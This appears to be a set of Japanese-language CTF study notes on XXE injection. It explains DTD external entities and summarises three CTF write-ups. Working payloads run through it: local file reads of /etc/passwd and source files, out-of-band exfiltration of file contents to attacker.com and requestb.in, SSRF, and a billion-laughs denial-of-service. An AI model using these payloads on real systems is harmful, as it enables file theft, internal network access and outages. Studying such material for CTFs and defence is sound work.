<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [XXE Injection](#xxe-injection)
  - [概要](#%E6%A6%82%E8%A6%81)
  - [例](#%E4%BE%8B)
    - [LFI](#lfi)
    - [Blind LFI](#blind-lfi)
    - [SSRF](#ssrf)
    - [DOS](#dos)
- [writeup](#writeup)
  - [OOB XXE (obtain index.php / indentify webshell's fullpath)](#oob-xxe-obtain-indexphp--indentify-webshells-fullpath)
  - [OOB XXE (SSRF / 二重XXE)](#oob-xxe-ssrf--%E4%BA%8C%E9%87%8Dxxe)
  - [sample](#sample)
- [メモ](#%E3%83%A1%E3%83%A2)
- [参考](#%E5%8F%82%E8%80%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# XXE Injection
## 概要

以下のようなXML形式でのリクエストがある場合、   
```txt
POST http://example.com/xml HTTP/1.1

<foo>
Hello World
</foo>
```
改竄して以下を送信することで、応答にリクエストの結果が返される場合は`/etc/passwd`が得られる！   
```txt
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
これはXMLの`<!ENTITY `タグで内部または外部にあるデータ(エンティティ)を挿入できることができるような`DTD`構文を使った機能が原因。   
`<!DOCTYPE`内がDTD。   
`<!ELEMENT foo ANY>`が構造の定義で、`<!ENTITY `からが実体宣言。DTDでは構造定義と実体宣言を行う必要があるっぽい。   
内部エンティティは`<!ENTITY test "aaaa">`みたいに定義する。   
外部エンティティは`<!ENTITY xxe SYSTEM "file:///etc/passwd">`みたいに`SYSTEM`を使って実体参照を行う。   
   
この脆弱性を防ぐにはDTD構文を使った実体参照の機能を禁止する必要があるらしい。   
## 例
### LFI
XMLを解析した結果をアプリケーションが返してくれる時。   
```txt
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```
上記だと`<`とかの特殊文字の入ったファイルは実体参照の後XML構文として解析されてしまって攻撃リクエストが壊れるので、そういう時はパラメータエンティティという手法を使える。   
https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/   

```txt
POST http://example.com/xml HTTP/1.1

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://attacker.com/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>


// attacker.com/evil.dtd
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents 
'%start;%file;%end;'>">
```
また、対象がPHPアプリケーションの場合、Base64エンコードすることでも可能！これならバイナリファイルも読み取れる。   
```txt
POST http://example.com/xml.php HTTP/1.1

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "php://filter/read=convert.base64-encode/resource=/etc/fstab">
]>
<foo>
  &bar;
</foo>
```
### Blind LFI
結果がわからないときはBlindみたいにして、攻撃者の用意したサーバーにアクセスさせるしかない。   
```txt
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
```
### SSRF
外からはアクセスできないIPアドレスとかにアクセスさせることができる。   
```txt
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```
### DOS
```txt
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
# writeup
## OOB XXE (obtain index.php / indentify webshell's fullpath)
https://github.com/shvetsovalex/ctf/tree/master/2018/VolgaCTF-quals/Shop%20quest   
- **entrypoint**   
製品情報をXML形式で保存するのでXXEに脆弱かも？と考える。   
- **概要**   
webshellはアップできていてもそのフルパスがわからない。その時に`index.php`をOOB XXEで閲覧してソースを読んでファイルパスを特定する。   
- **Payload**   
```txt
// 多分これをPOSTするかんじ
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://attacker.com/oob.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

// oob.xml   (これは攻撃者サーバーにセット)
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
```
## OOB XXE (SSRF / 二重XXE)
https://qiita.com/no1zy_sec/items/03b8f335e84995fec3e3   
- **entrypoint**   
問題文が`xmlvalidator`だからXXEを疑う？   
- **概要**   
ローカルネットワークからしかアクセスできないので別のXMLの問題のページからXXEでページを読み込む(ソースではない)   
`loadxml`に`$_REQUEST['xml']`の内容が入るのでまたXXE脆弱。応答を返さないのでOOB XXEで攻撃者サーバーにアクセスさせる。      
- **Payload**   
```txt
// 別の問題ページから送信する内容　（2重にXXEしてる）
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "php://filter/convert.base64-encode/resource=http://xmlvalidator/?xml=%3C%21DOCTYPE+root+%5B%3C%21ELEMENT+root+ANY+%3E%3C%21ENTITY+%25+xxe+SYSTEM+%22https%3A%2F%2Fexample.com%2Fxxe.dtd%22%3E%25xxe%3B%5D%3E%3Croot%3E%26startme%3B%3Croot%3E">
]>
<foo>
  &bar;
</foo>


// xxe.dtd (攻撃者サーバーに用意する)
<!ENTITY % filebase64 SYSTEM "php://filter/convert.base64-encode/resource=flag.php">
<!ENTITY % injme '<!ENTITY startme SYSTEM "https://requestb.in/xxxxxxx?xxe=%filebase64;">'>%injme;
```
## XXE (normai XXE / identify webroot or /proc/self/cwd)
https://www.aquablog.site/entry/2019/03/25/093034   

- **entrypoint**   
IndexページのJavascriptのソースコード内にJavascriptでXML形式のデータをXMLHttpRequestで送信して、返ってきたデータを`.innerHTML`に入れて表示する。ここからXXEを疑う。   
- **概要**   
応答が返ってくるので普通のXXE。flagのフルパスがわからないので`file:///etc/nginx/sites-enabled/default`でNginxのWebルートを特定するか、`file:///proc/self/cwd/`,`php://filter`とかでflagファイルをゲットできるらしい。   
- **Payload**   
```txt
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///var/www/html/epreuve/flag" >]><feedback><author>&xxe;</author><email>a</email><content>undefined</content></feedback>
```
## sample
- **entrypoint**   
- **概要**   
- **Payload**   
## sample
- **entrypoint**   
- **概要**   
- **Payload**   
## sample
- **entrypoint**   
- **概要**   
- **Payload**   
## sample
- **entrypoint**   
- **概要**   
- **Payload**   

# メモ
`hackerone report xxe`とかでググるといろいろ出てくる。   
`xxe ctf`,`xxe vulnhub`,`xxe hackthebox`とか。   
応答が返ってくるかで、普通のXXEかOOB XXEかが判別できそう。   

# 参考
https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md   
チートシート   
https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/   
わかりやすい解説   
https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing   

OWASPの説明   
https://portswigger.net/web-security/xxe#:~:text=XML%20external%20entity%20injection%20(also,application's%20processing%20of%20XML%20data.   
わかりやすそうな説明。   
https://yamory.io/blog/what-is-xxe/   
日本語の説明   
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe   
PayloadAllThings
https://phonexicum.github.io/infosec/xxe.html#exploitation-ways   
いろいろまとまっててよさげ   
